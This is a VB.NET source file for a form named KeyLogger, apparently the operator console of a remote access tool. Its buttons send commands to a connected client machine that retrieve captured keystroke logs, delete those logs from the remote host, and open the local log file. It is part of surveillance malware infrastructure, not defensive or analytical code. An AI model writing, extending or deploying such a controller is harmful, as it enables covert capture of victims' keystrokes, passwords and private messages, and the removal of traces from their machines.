﻿Public Class KeyLogger
    Public cli As Client

    Private Sub RefreshButton_Click(sender As Object, e As EventArgs) Handles RefreshButton.Click
        Main.S.Send(cli, Main.n.getklog) ''get keylogger logs
    End Sub

    Private Sub ClearButton_Click(sender As Object, e As EventArgs) Handles ClearButton.Click
        Main.S.Send(cli, Main.n.delklog) ''delete from host
    End Sub

    Private Sub OpenButton_Click(sender As Object, e As EventArgs) Handles OpenButton.Click
        ''Main.CurrentClientChange(Main.L1.Items(sock.ToString))
        Process.Start(Main.klf)
    End Sub

    Private Sub KeyLogger_Shown(sender As Object, e As EventArgs) Handles MyBase.Shown
        WebBrowser.Navigate("about:blank")
        Main.S.Send(cli, Main.n.getklog) ''get keylogger logs
    End Sub
End Class